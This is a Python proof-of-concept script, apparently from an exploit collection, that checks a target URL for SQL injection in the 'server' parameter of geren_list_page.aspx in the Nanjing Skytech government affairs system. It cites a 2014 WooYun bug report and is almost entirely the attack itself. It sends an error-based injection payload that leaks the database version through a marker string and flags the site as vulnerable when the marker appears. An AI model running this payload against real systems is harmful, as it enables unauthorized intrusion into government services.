#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 南京擎天政务系统 geren_list_page.aspx SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2014-075253
author: Lucifer
description: 文件/index_page/geren_list_page.aspx中,参数server存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class skytech_geren_list_page_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/mqweb/index_page/geren_list_page.aspx?server=1%27and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--&refid="
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"WtFaBcMicrosoft" in req.text:
                cprint("[+]存在南京擎天政务系统 geren_list_page.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = skytech_geren_list_page_sqli_BaseVerify(sys.argv[1])
    testVuln.run()